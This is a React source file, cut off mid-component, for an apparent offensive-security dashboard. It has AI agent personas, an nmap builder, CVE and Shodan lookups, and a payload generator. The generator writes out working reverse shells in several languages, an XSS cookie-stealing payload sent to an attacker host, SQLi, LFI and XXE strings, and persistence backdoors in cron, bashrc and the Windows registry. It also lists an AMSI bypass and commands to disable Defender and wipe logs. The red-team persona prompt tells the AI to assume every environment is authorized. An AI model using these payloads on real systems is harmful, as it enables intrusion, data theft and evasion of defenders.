import { useState, useRef, useEffect, useCallback } from "react";

const AGENTS = {
  PHANTOM: {
    id: "PHANTOM", role: "RED TEAM", color: "#ff3b3b",
    glow: "rgba(255,59,59,0.4)", dimColor: "rgba(255,59,59,0.15)", accent: "#ff6b6b",
    icon: "☠", tagline: "Offensive Security Specialist", status: "ACTIVE",
    systemPrompt: `You are PHANTOM, an elite Red Team AI agent and offensive security specialist inside NEXUS. Expertise: penetration testing (PTES, OWASP, NIST), reconnaissance & OSINT, CVE/exploit research, network attacks (MITM, ARP, DNS), web app attacks (SQLi, XSS, SSRF, RCE, IDOR), social engineering, wireless security (WPA2/3, evil twin), Active Directory attacks (Kerberoasting, Pass-the-Hash, DCSync), post-exploitation, lateral movement, CTF (HackTheBox, TryHackMe), malware analysis, Python/Bash/PowerShell, MITRE ATT&CK. Tactical operator tone. Assume authorized environments. Always note authorized-use-only.`
  },
  SENTINEL: {
    id: "SENTINEL", role: "BLUE TEAM", color: "#00d4ff",
    glow: "rgba(0,212,255,0.4)", dimColor: "rgba(0,212,255,0.15)", accent: "#4dddff",
    icon: "🛡", tagline: "Defense & Threat Intelligence", status: "MONITORING",
    systemPrompt: `You are SENTINEL, an elite Blue Team AI agent inside NEXUS. Expertise: threat detection & IR, SIEM (Splunk, ELK, QRadar), threat hunting, DFIR, malware analysis, network traffic analysis (Wireshark, Zeek, Suricata), EDR/XDR, system hardening (CIS, STIGs), firewall/IDS/IPS, Zero Trust, threat intel (MISP, OpenCTI, MITRE D3FEND), cloud security, compliance (SOC2, ISO 27001, NIST CSF, PCI-DSS), SOAR, IOC identification. Calm, analytical, intelligence-briefing tone.`
  },
  GHOST: {
    id: "GHOST", role: "GREY TEAM", color: "#a855f7",
    glow: "rgba(168,85,247,0.4)", dimColor: "rgba(168,85,247,0.15)", accent: "#c084fc",
    icon: "👁", tagline: "Research, OSINT & Vuln Intelligence", status: "SHADOW OPS",
    systemPrompt: `You are GHOST, an elite Grey Team AI agent inside NEXUS. Expertise: advanced OSINT (Maltego, Shodan, Censys, theHarvester, Recon-ng), CVE research, bug bounty (HackerOne, Bugcrowd), responsible disclosure, hardware hacking (Arduino, ESP32, RPi), firmware analysis, RF/wireless (SDR, Flipper Zero, HackRF), custom tool development, dark web monitoring, cryptography, steganography, supply chain security, zero-day research, CTF strategy, privacy engineering. Mysterious, research-focused tone. Always emphasize ethical/legal boundaries.`
  }
};

const NMAP_SCAN_TYPES = [
  { val: "-sS", label: "SYN Stealth (-sS)" }, { val: "-sT", label: "TCP Connect (-sT)" },
  { val: "-sU", label: "UDP Scan (-sU)" }, { val: "-sV", label: "Version Detection (-sV)" },
  { val: "-sn", label: "Ping Sweep (-sn)" }, { val: "-sA", label: "ACK Scan (-sA)" },
  { val: "-sN", label: "NULL Scan (-sN)" }, { val: "-sF", label: "FIN Scan (-sF)" },
  { val: "-sX", label: "XMAS Scan (-sX)" },
];
const NMAP_TIMING = [
  { val: "-T0", label: "T0 - Paranoid" }, { val: "-T1", label: "T1 - Sneaky" },
  { val: "-T2", label: "T2 - Polite" }, { val: "-T3", label: "T3 - Normal" },
  { val: "-T4", label: "T4 - Aggressive" }, { val: "-T5", label: "T5 - Insane" },
];
const NMAP_PORTS = [
  { val: "", label: "Default (top 1000)" }, { val: "-p-", label: "All (1-65535)" },
  { val: "-p 1-1024", label: "Well-known (1-1024)" }, { val: "-p 80,443,8080,8443", label: "Web ports" },
  { val: "-p 21,22,23,25,53,110,143,3306,3389", label: "Common services" },
  { val: "--top-ports 100", label: "Top 100" }, { val: "--top-ports 500", label: "Top 500" },
];
const NMAP_EXTRAS = [
  { val: "-O", label: "OS Detection" }, { val: "-A", label: "Aggressive (-A)" },
  { val: "--script=vuln", label: "Vuln Scripts" }, { val: "--script=default", label: "Default Scripts" },
  { val: "--script=auth", label: "Auth Scripts" }, { val: "--script=exploit", label: "Exploit Scripts" },
  { val: "-D RND:10", label: "Decoy Scan" }, { val: "--source-port 53", label: "Spoof Port 53" },
  { val: "-f", label: "Fragment Packets" }, { val: "-oN out.txt", label: "Save Normal" },
  { val: "-oX out.xml", label: "Save XML" }, { val: "-v", label: "Verbose" },
  { val: "--open", label: "Open Only" },
];

const PAYLOAD_CATS = {
  "Reverse Shells": {
    color: "#ff3b3b",
    payloads: {
      "Bash TCP": (ip, port) => `bash -i >& /dev/tcp/${ip}/${port} 0>&1`,
      "Python3": (ip, port) => `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
      "Netcat -e": (ip, port) => `nc -e /bin/sh ${ip} ${port}`,
      "Netcat mkfifo": (ip, port) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`,
      "PHP": (ip, port) => `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`,
      "PowerShell": (ip, port) => `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('${ip}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb3=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb3,0,$sb3.Length)};$c.Close()"`,
      "Ruby": (ip, port) => `ruby -rsocket -e'f=TCPSocket.open("${ip}",${port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
      "Perl": (ip, port) => `perl -e 'use Socket;$i="${ip}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'`,
    }
  },
  "Web Attacks": {
    color: "#ff8c00",
    payloads: {
      "XSS Alert": () => `<script>alert('XSS')</script>`,
      "XSS Cookie Steal": (ip, port) => `<script>document.location='http://${ip}:${port}/?c='+document.cookie</script>`,
      "XSS img onerror": () => `<img src=x onerror=alert(1)>`,
      "XSS SVG": () => `<svg onload=alert(1)>`,
      "SQLi Auth Bypass": () => `' OR '1'='1' -- -`,
      "SQLi UNION 2col": () => `' UNION SELECT NULL,NULL -- -`,
      "SQLi Version": () => `' UNION SELECT @@version,NULL -- -`,
      "SQLi Time-Based": () => `'; WAITFOR DELAY '0:0:5' -- -`,
      "SSRF Localhost": () => `http://127.0.0.1/admin`,
      "SSRF AWS Metadata": () => `http://169.254.169.254/latest/meta-data/`,
      "LFI Basic": () => `../../../../etc/passwd`,
      "LFI PHP Wrapper": () => `php://filter/convert.base64-encode/resource=/etc/passwd`,
      "XXE Basic": () => `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>`,
    }
  },
  "Privilege Escalation": {
    color: "#ffcc00",
    payloads: {
      "Find SUID": () => `find / -perm -u=s -type f 2>/dev/null`,
      "Sudo -l": () => `sudo -l`,
      "Cron Jobs": () => `cat /etc/crontab && ls -la /etc/cron*`,
      "Capabilities": () => `getcap -r / 2>/dev/null`,
      "World Writable": () => `find / -writable -type f 2>/dev/null | grep -v proc`,
      "Kernel Info": () => `uname -a && cat /etc/os-release`,
      "LinPEAS": () => `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`,
      "WinPEAS": () => `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat')`,
    }
  },
  "Persistence": {
    color: "#a855f7",
    payloads: {
      "Cron Backdoor": (ip, port) => `(crontab -l 2>/dev/null; echo "* * * * * bash -i >& /dev/tcp/${ip}/${port} 0>&1") | crontab -`,
      "SSH Key": () => `mkdir -p ~/.ssh && echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys`,
      "Bashrc": (ip, port) => `echo "bash -i >& /dev/tcp/${ip}/${port} 0>&1" >> ~/.bashrc`,
      "Registry Run": (ip, port) => `reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d "powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://${ip}:${port}/s.ps1')"`,
    }
  },
  "Evasion": {
    color: "#00d4ff",
    payloads: {
      "Base64 Encode": () => `echo "COMMAND" | base64`,
      "Base64 Exec": () => `echo "BASE64" | base64 -d | bash`,
      "PS Bypass AMSI": () => `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`,
      "Disable Defender": () => `Set-MpPreference -DisableRealtimeMonitoring $true`,
      "Clear Bash History": () => `history -c && echo "" > ~/.bash_history && export HISTFILESIZE=0`,
      "Clear Win Logs": () => `wevtutil cl System && wevtutil cl Security && wevtutil cl Application`,
      "Timestomp": () => `touch -r /bin/ls /path/to/file`,
    }
  }
};

const S = {
  input: (c = "rgba(255,255,255,0.15)") => ({ background: "rgba(0,0,0,0.4)", border: `1px solid ${c}`, borderRadius: 5, color: "#e0e0e0", fontFamily: "monospace", fontSize: 12, padding: "8px 12px", outline: "none", width: "100%", boxSizing: "border-box" }),
  select: (c = "rgba(255,255,255,0.15)") => ({ background: "rgba(0,0,0,0.6)", border: `1px solid ${c}`, borderRadius: 5, color: "#e0e0e0", fontFamily: "monospace", fontSize: 12, padding: "8px 10px", outline: "none", width: "100%", cursor: "pointer" }),
  btn: (c = "#00ff41", bg = "rgba(0,255,65,0.1)") => ({ background: bg, border: `1px solid ${c}`, borderRadius: 5, color: c, fontFamily: "monospace", fontSize: 12, padding: "8px 16px", cursor: "pointer", letterSpacing: 1, transition: "all 0.2s", whiteSpace: "nowrap" }),
  card: (c = "rgba(255,255,255,0.06)") => ({ background: "rgba(0,0,0,0.4)", border: `1px solid ${c}`, borderRadius: 8, padding: 16 }),
  label: { color: "rgba(255,255,255,0.35)", fontSize: 10, letterSpacing: 2, fontFamily: "monospace", marginBottom: 5, display: "block" },
  code: { background: "rgba(0,0,0,0.6)", border: "1px solid rgba(0,255,65,0.25)", borderRadius: 6, padding: "12px 16px", fontFamily: "monospace", fontSize: 12, color: "#00ff41", wordBreak: "break-all", lineHeight: 1.6, whiteSpace: "pre-wrap" },
  sec: { color: "rgba(255,255,255,0.2)", fontSize: 9, letterSpacing: 3, fontFamily: "monospace", marginBottom: 10 },
};

const MatrixRain = () => {
  const r = useRef(null);
  useEffect(() => {
    const c = r.current; if (!c) return;
    const x = c.getContext("2d");
    c.width = window.innerWidth; c.height = window.innerHeight;
    const ch = "01アイウエオNEXUSカキクケコ";
    const cols = Math.floor(c.width / 20);
    const d = Array(cols).fill(1);
    const draw = () => {
      x.fillStyle = "rgba(0,0,0,0.04)"; x.fillRect(0, 0, c.width, c.height);
      x.fillStyle = "rgba(0,255,65,0.11)"; x.font = "13px monospace";
      d.forEach((y, i) => {
        x.fillText(ch[Math.floor(Math.random() * ch.length)], i * 20, y * 20);
        if (y * 20 > c.height && Math.random() > 0.975) d[i] = 0;
        d[i]++;
      });
    };
    const iv = setInterval(draw, 55); return () => clearInterval(iv);
  }, []);
  return <canvas ref={r} style={{ position: "fixed", top: 0, left: 0, zIndex: 0, opacity: 0.25, pointerEvents: "none" }} />;
};

const TW = ({ text, speed = 8 }) => {
  const [d, setD] = useState(""); const [done, setDone] = useState(false);
  useEffect(() => {
    setD(""); setDone(false); if (!text) return;
    let i = 0;
    const iv = setInterval(() => {
      if (i < text.length) { setD(text.slice(0, i + 1)); i++; } else { setDone(true); clearInterval(iv); }
    }, speed);
    return () => clearInterval(iv);
  }, [text]);
  return <span>{d}{!done && <span style={{ animation: "blink .7s infinite" }}>█</span>}</span>;
};

const NmapBuilder = () => {
  const [target, setTarget] = useState("192.168.1.0/24");
  const [scanType, setScanType] = useState("-sS");
  const [timing, setTiming] = useState("-T4");
  const [ports, setPorts] = useState("");
  const [extras, setExtras] = useState([]);
  const [cmd, setCmd] = useState("");
  const build = () => setCmd(["nmap", scanType, timing, ports, ...extras, target].filter(Boolean).join(" "));
  const tog = v => setExtras(p => p.includes(v) ? p.filter(x => x !== v) : [...p, v]);
  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 14 }}>
      <div style={S.card("rgba(0,255,65,0.15)")}>
        <div style={{ color: "#00ff41", fontSize: 12, letterSpacing: 3, marginBottom: 12 }}>⚙ NMAP COMMAND BUILDER</div>
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
          <div><span style={S.label}>TARGET</span><input value={target} onChange={e => setTarget(e.target.value)} style={S.input("rgba(0,255,65,0.3)")} /></div>
          <div><span style={S.label}>SCAN TYPE</span><select value={scanType} onChange={e => setScanType(e.target.value)} style={S.select("rgba(0,255,65,0.3)")}>{NMAP_SCAN_TYPES.map(o => <option key={o.val} value={o.val}>{o.label}</option>)}</select></div>
          <div><span style={S.label}>TIMING</span><select value={timing} onChange={e => setTiming(e.target.value)} style={S.select("rgba(0,255,65,0.3)")}>{NMAP_TIMING.map(o => <option key={o.val} value={o.val}>{o.label}</option>)}</select></div>
          <div><span style={S.label}>PORTS</span><select value={ports} onChange={e => setPorts(e.target.value)} style={S.select("rgba(0,255,65,0.3)")}>{NMAP_PORTS.map(o => <option key={o.val} value={o.val}>{o.label}</option>)}</select></div>
        </div>
        <div style={{ marginTop: 12 }}>
          <span style={S.label}>EXTRA FLAGS</span>
          <div style={{ display: "flex", flexWrap: "wrap", gap: 6 }}>
            {NMAP_EXTRAS.map(o => (
              <div key={o.val} onClick={() => tog(o.val)} style={{ padding: "4px 10px", borderRadius: 4, fontSize: 11, cursor: "pointer", fontFamily: "monospace", border: `1px solid ${extras.includes(o.val) ? "#00ff41" : "rgba(255,255,255,0.1)"}`, background: extras.includes(o.val) ? "rgba(0,255,65,0.12)" : "rgba(0,0,0,0.3)", color: extras.includes(o.val) ? "#00ff41" : "rgba(255,255,255,0.4)", transition: "all 0.2s" }}>{o.label}</div>
            ))}
          </div>
        </div>
        <button onClick={build} style={{ ...S.btn(), marginTop: 14 }}>▶ GENERATE</button>
      </div>
      {cmd && (<div><span style={S.label}>COMMAND</span><div style={S.code}>{cmd}</div><button onClick={() => navigator.clipboard.writeText(cmd)} style={{ ...S.btn("#00d4ff", "rgba(0,212,255,0.1)"), marginTop: 8, fontSize: 11 }}>⎘ COPY</button></div>)}
      <div style={S.card("rgba(255,255,255,0.04)")}>
        <div style={{ color: "rgba(255,255,255,0.3)", fontSize: 11, marginBottom: 8 }}>QUICK COMMANDS</div>
        {[["Full stealth + vuln", "nmap -sS -T2 -A --script=vuln -p- TARGET"], ["Fast host discovery", "nmap -sn 192.168.1.0/24"], ["Web app scan", "nmap -sV -p 80,443,8080,8443 --script=http-enum TARGET"], ["SMB enum + EternalBlue", "nmap -p 139,445 --script=smb-enum-shares,smb-vuln-ms17-010 TARGET"], ["Full UDP top 100", "nmap -sU --top-ports 100 -T4 TARGET"]].map(([n, c]) => (
          <div key={n} onClick={() => setCmd(c)} style={{ padding: "7px 10px", border: "1px solid rgba(255,255,255,0.06)", borderRadius: 4, marginBottom: 4, cursor: "pointer", fontSize: 11, fontFamily: "monospace", color: "rgba(255,255,255,0.45)", transition: "all 0.2s" }} onMouseOver={e => e.currentTarget.style.color = "#00ff41"} onMouseOut={e => e.currentTarget.style.color = "rgba(255,255,255,0.45)"}>▸ {n}</div>
        ))}
      </div>
    </div>
  );
};

const PayloadGen = () => {
  const [cat, setCat] = useState("Reverse Shells");
  const [key, setKey] = useState("Bash TCP");
  const [ip, setIp] = useState("10.10.10.10");
  const [port, setPort] = useState("4444");
  const [result, setResult] = useState("");
  const [encoded, setEncoded] = useState("");
  const gen = () => { const fn = PAYLOAD_CATS[cat]?.payloads[key]; if (!fn) return; const r = fn(ip, port); setResult(r); setEncoded(btoa(unescape(encodeURIComponent(r)))); };
  const payloadKeys = Object.keys(PAYLOAD_CATS[cat]?.payloads || {});
  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 14 }}>
      <div style={S.card("rgba(255,59,59,0.15)")}>
        <div style={{ color: "#ff3b3b", fontSize: 12, letterSpacing: 3, marginBottom: 12 }}>☠ PAYLOAD GENERATOR</div>
        <div style={{ display: "flex", gap: 8, marginBottom: 12, flexWrap: "wrap" }}>
          {Object.keys(PAYLOAD_CATS).map(k => (
            <div key={k} onClick={() => { setCat(k); setKey(Object.keys(PAYLOAD_CATS[k].payloads)[0]); setResult(""); }} style={{ padding: "5px 12px", borderRadius: 4, fontSize: 11, cursor: "pointer", fontFamily: "monospace", border: `1px solid ${cat === k ? PAYLOAD_CATS[k].color : "rgba(255,255,255,0.1)"}`, background: cat === k ? `${PAYLOAD_CATS[k].color}20` : "rgba(0,0,0,0.3)", color: cat === k ? PAYLOAD_CATS[k].color : "rgba(255,255,255,0.4)" }}>{k}</div>
          ))}
        </div>
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 120px 90px", gap: 10, alignItems: "end" }}>
          <div><span style={S.label}>PAYLOAD</span><select value={key} onChange={e => setKey(e.target.value)} style={S.select(`${PAYLOAD_CATS[cat].color}50`)}>{payloadKeys.map(k => <option key={k}>{k}</option>)}</select></div>
          <div><span style={S.label}>LHOST</span><input value={ip} onChange={e => setIp(e.target.value)} style={S.input(`${PAYLOAD_CATS[cat].color}50`)} /></div>
          <div><span style={S.label}>LPORT</span><input value={port} onChange={e => setPort(e.target.value)} style={S.input(`${PAYLOAD_CATS[cat].color}50`)} /></div>
          <button onClick={gen} style={{ ...S.btn(PAYLOAD_CATS[cat].color, `${PAYLOAD_CATS[cat].color}18`), height: 36 }}>▶ GEN</button>
        </div>
      </div>
      {result && (
        <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
          <div><span style={S.label}>RAW PAYLOAD</span><div style={S.code}>{result}</div><button onClick={() => navigator.clipboard.writeText(result)} style={{ ...S.btn("#ff3b3b", "rgba(255,59,59,0.1)"), marginTop: 6, fontSize: 11 }}>⎘ COPY RAW</button></div>
          <div><span style={S.label}>BASE64 ENCODED</span><div style={{ ...S.code, color: "#a855f7" }}>{encoded}</div><button onClick={() => navigator.clipboard.writeText(encoded)} style={{ ...S.btn("#a855f7", "rgba(168,85,247,0.1)"), marginTop: 6, fontSize: 11 }}>⎘ COPY B64</button></div>
          <div style={S.card("rgba(255,200,0,0.1)")}><div style={{ color: "#ffcc00", fontSize: 11, fontFamily: "monospace" }}>⚠ LISTENER (run first):</div><div style={{ ...S.code, marginTop: 8, color: "#ffcc00" }}>{`nc -nvlp ${port}`}</div></div>
        </div>
      )}
    </div>
  );
};

const CVELookup = () => {
  const [q, setQ] = useState(""); const [res, setRes] = useState([]); const [loading, setLoading] = useState(false); const [err, setErr] = useState(""); const [sel, setSel] = useState(null);
  const search = async () => {
    if (!q.trim()) return; setLoading(true); setErr(""); setRes([]); setSel(null);
    try {
      const isCVE = /CVE-\d{4}-\d+/i.test(q.trim());
      const url = isCVE ? `https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=${q.trim().toUpperCase()}` : `https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=${encodeURIComponent(q)}&resultsPerPage=10`;
      const r = await fetch(url); const d = await r.json();
      setRes(d.vulnerabilities || []); if (!d.vulnerabilities?.length) setErr("No CVEs found.");
    } catch (e) { setErr("NVD API error: " + e.message); }
    setLoading(false);
  };
  const getCVSS = cve => {
    const m = cve.metrics;
    if (m?.cvssMetricV31?.[0]) return { score: m.cvssMetricV31[0].cvssData.baseScore, sev: m.cvssMetricV31[0].cvssData.baseSeverity, ver: "v3.1" };
    if (m?.cvssMetricV30?.[0]) return { score: m.cvssMetricV30[0].cvssData.baseScore, sev: m.cvssMetricV30[0].cvssData.baseSeverity, ver: "v3.0" };
    if (m?.cvssMetricV2?.[0]) return { score: m.cvssMetricV2[0].cvssData.baseScore, sev: m.cvssMetricV2[0].baseSeverity, ver: "v2" };
    return null;
  };
  const sevC = s => ({ CRITICAL: "#ff0040", HIGH: "#ff3b3b", MEDIUM: "#ff8c00", LOW: "#ffcc00" }[s] || "#aaa");
  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 14 }}>
      <div style={S.card("rgba(0,212,255,0.15)")}>
        <div style={{ color: "#00d4ff", fontSize: 12, letterSpacing: 3, marginBottom: 12 }}>🔍 CVE LOOKUP — NVD DATABASE</div>
        <div style={{ display: "flex", gap: 10 }}>
          <input value={q} onChange={e => setQ(e.target.value)} onKeyDown={e => e.key === "Enter" && search()} placeholder="CVE-2024-6387 or keyword (log4j, RCE, apache)..." style={{ ...S.input("rgba(0,212,255,0.4)"), flex: 1 }} />
          <button onClick={search} style={S.btn("#00d4ff", "rgba(0,212,255,0.12)")} disabled={loading}>{loading ? "SCANNING..." : "▶ SEARCH"}</button>
        </div>
        <div style={{ display: "flex", gap: 8, marginTop: 8, flexWrap: "wrap" }}>
          {["log4j", "CVE-2024-6387", "EternalBlue", "Log4Shell", "ProxyShell", "PrintNightmare", "Heartbleed"].map(x => (
            <div key={x} onClick={() => setQ(x)} style={{ padding: "3px 10px", borderRadius: 3, fontSize: 10, cursor: "pointer", border: "1px solid rgba(0,212,255,0.2)", color: "rgba(0,212,255,0.6)", fontFamily: "monospace" }}>{x}</div>
          ))}
        </div>
      </div>
      {err && <div style={{ color: "#ff3b3b", fontSize: 12, fontFamily: "monospace", padding: "10px 14px", border: "1px solid rgba(255,59,59,0.3)", borderRadius: 6 }}>⚠ {err}</div>}
      {res.length > 0 && (
        <div style={{ display: "flex", gap: 14 }}>
          <div style={{ width: 280, flexShrink: 0, display: "flex", flexDirection: "column", gap: 6, overflowY: "auto", maxHeight: 480 }}>
            {res.map(({ cve }) => { const cvss = getCVSS(cve); return (
              <div key={cve.id} onClick={() => setSel(cve)} style={{ padding: "10px 12px", border: `1px solid ${sel?.id === cve.id ? "#00d4ff" : "rgba(255,255,255,0.08)"}`, borderRadius: 6, cursor: "pointer", background: sel?.id === cve.id ? "rgba(0,212,255,0.08)" : "rgba(0,0,0,0.3)", transition: "all 0.2s" }}>
                <div style={{ display: "flex", justifyContent: "space-between" }}>
                  <span style={{ color: "#00d4ff", fontSize: 11, fontFamily: "monospace" }}>{cve.id}</span>
                  {cvss && <span style={{ color: sevC(cvss.sev), fontSize: 12, fontWeight: "bold" }}>{cvss.score}</span>}
                </div>
                {cvss && <div style={{ color: sevC(cvss.sev), fontSize: 9, letterSpacing: 1, marginTop: 2 }}>{cvss.sev} · {cvss.ver}</div>}
                <div style={{ color: "rgba(255,255,255,0.35)", fontSize: 10, marginTop: 4, lineHeight: 1.4 }}>{cve.descriptions?.find(d => d.lang === "en")?.value?.slice(0, 80)}...</div>
              </div>
            );})}
          </div>
          {sel && (() => {
            const cvss = getCVSS(sel); const desc = sel.descriptions?.find(d => d.lang === "en")?.value;
            return (
              <div style={{ flex: 1, ...S.card("rgba(0,212,255,0.08)"), overflowY: "auto", maxHeight: 480 }}>
                <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 10 }}>
                  <div style={{ color: "#00d4ff", fontSize: 14, fontFamily: "monospace", fontWeight: "bold" }}>{sel.id}</div>
                  {cvss && <div style={{ textAlign: "right" }}><div style={{ color: sevC(cvss.sev), fontSize: 24, fontWeight: "bold" }}>{cvss.score}</div><div style={{ color: sevC(cvss.sev), fontSize: 9, letterSpacing: 2 }}>{cvss.sev}</div></div>}
                </div>
                <div style={{ color: "rgba(255,255,255,0.7)", fontSize: 12, lineHeight: 1.7, marginBottom: 12 }}>{desc}</div>
                {sel.weaknesses?.flatMap(w => w.description).map(d => d.value).join(", ") && (
                  <div style={{ marginBottom: 10 }}><span style={S.label}>CWE</span><span style={{ color: "#ff8c00", fontSize: 12, fontFamily: "monospace" }}>{sel.weaknesses.flatMap(w => w.description).map(d => d.value).join(", ")}</span></div>
                )}
                <div style={{ marginBottom: 10 }}><span style={S.label}>PUBLISHED</span><span style={{ color: "rgba(255,255,255,0.5)", fontSize: 12, fontFamily: "monospace" }}>{new Date(sel.published).toLocaleDateString()}</span></div>
                {sel.references?.slice(0, 5).map((r, i) => (
                  <div key={i} style={{ marginBottom: 4 }}><a href={r.url} target="_blank" rel="noreferrer" style={{ color: "#00d4ff", fontSize: 11, fontFamily: "monospace", textDecoration: "none", wordBreak: "break-all" }}>▸ {r.url}</a></div>
                ))}
              </div>
            );
          })()}
        </div>
      )}
    </div>
  );
};

const ShodanSearch = () => {
  const [apiKey, setApiKey] = useState(""); const [q, setQ] = useState(""); const [res, setRes] = useState(null); const [loading, setLoading] = useState(false); const [err, setErr] = useState(""); const [ipQ, setIpQ] = useState(""); const [ipInfo, setIpInfo] = useState(null); const [mode, setMode] = useState("search");
  const search = async () => {
    if (!apiKey || !q.trim()) { setErr("API key and query required."); return; }
    setLoading(true); setErr(""); setRes(null);
    try {
      const r = await fetch(`https://api.shodan.io/shodan/host/search?key=${apiKey}&query=${encodeURIComponent(q)}&minify=true`);
      const d = await r.json(); if (d.error) setErr(d.error); else setRes(d);
    } catch { setErr("CORS blocked. Shodan restricts direct browser requests. Use their CLI: shodan search \"" + q + "\" or enable a CORS proxy."); }
    setLoading(false);
  };
  const lookupIp = async () => {
    if (!apiKey || !ipQ.trim()) { setErr("API key and IP required."); return; }
    setLoading(true); setErr(""); setIpInfo(null);
    try {
      const r = await fetch(`https://api.shodan.io/shodan/host/${ipQ.trim()}?key=${apiKey}`);
      const d = await r.json(); if (d.error) setErr(d.error); else setIpInfo(d);
    } catch { setErr("CORS blocked by Shodan. Use CLI: shodan host " + ipQ.trim()); }
    setLoading(false);
  };
  const DORKS = [["Open RDP + screenshot", "port:3389 has_screenshot:true"], ["Unsecured MongoDB", "product:MongoDB port:27017"], ["VNC no auth", "port:5900 authentication disabled"], ["Open Elasticsearch", "port:9200 all:elastic"], ["SCADA/Industrial", "port:102 Siemens"], ["Apache Tomcat", "product:Apache Tomcat"], ["Default MikroTik", "os:RouterOS"], ["Webcams RTSP", "has_screenshot:true port:554"], ["Open Kibana", "port:5601 product:Kibana"], ["SSH open", "port:22 OpenSSH"]];
  return (
    <div style={{ display: "flex", flexDirection: "column", gap: 14 }}>
      <div style={S.card("rgba(255,140,0,0.15)")}>
        <div style={{ color: "#ff8c00", fontSize: 12, letterSpacing: 3, marginBottom: 12 }}>🌐 SHODAN INTELLIGENCE PLATFORM</div>
        <div><span style={S.label}>SHODAN API KEY</span><input value={apiKey} onChange={e => setApiKey(e.target.value)} placeholder="Get at shodan.io/account/register..." type="password" style={S.input("rgba(255,140,0,0.4)")} /></div>
        <div style={{ display: "flex", gap: 8, marginTop: 10 }}>
          {["search", "ip lookup"].map(m => (
            <div key={m} onClick={() => setMode(m)} style={{ padding: "5px 14px", borderRadius: 4, fontSize: 11, cursor: "pointer", fontFamily: "monospace", border: `1px solid ${mode === m ? "#ff8c00" : "rgba(255,255,255,0.1)"}`, background: mode === m ? "rgba(255,140,0,0.12)" : "transparent", color: mode === m ? "#ff8c00" : "rgba(255,255,255,0.35)" }}>{m.toUpperCase()}</div>
          ))}
        </div>
      </div>
      {mode === "search" && (
        <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
          <div style={{ display: "flex", gap: 10 }}>
            <input value={q} onChange={e => setQ(e.target.value)} onKeyDown={e => e.key === "Enter" && search()} placeholder="Shodan dork (e.g. port:22 country:NG)..." style={{ ...S.input("rgba(255,140,0,0.4)"), flex: 1 }} />
            <button onClick={search} style={S.btn("#ff8c00", "rgba(255,140,0,0.12)")} disabled={loading}>{loading ? "SEARCHING..." : "▶ SEARCH"}</button>
          </div>
          <div><span style={S.label}>DORK EXAMPLES</span><div style={{ display: "flex", flexWrap: "wrap", gap: 6 }}>{DORKS.map(([l, d]) => (<div key={l} onClick={() => setQ(d)} style={{ padding: "4px 10px", borderRadius: 3, fontSize: 10, cursor: "pointer", border: "1px solid rgba(255,140,0,0.2)", color: "rgba(255,140,0,0.65)", fontFamily: "monospace" }}>{l}</div>))}</div></div>
        </div>
      )}
      {mode === "ip lookup" && (
        <div style={{ display: "flex", gap: 10 }}>
          <input value={ipQ} onChange={e => setIpQ(e.target.value)} onKeyDown={e => e.key === "Enter" && lookupIp()} placeholder="IP address (e.g. 8.8.8.8)..." style={{ ...S.input("rgba(255,140,0,0.4)"), flex: 1 }} />
          <button onClick={lookupIp} style={S.btn("#ff8c00", "rgba(255,140,0,0.12)")} disabled={loading}>{loading ? "LOOKING UP..." : "▶ LOOKUP"}</button>
        </div>
      )}
      {err && <div style={{ color: "#ff3b3b", fontSize: 12, fontFamily: "monospace", padding: "10px 14px", border: "1px solid rgba(255,59,59,0.3)", borderRadius: 6, lineHeight: 1.6 }}>⚠ {err}</div>}
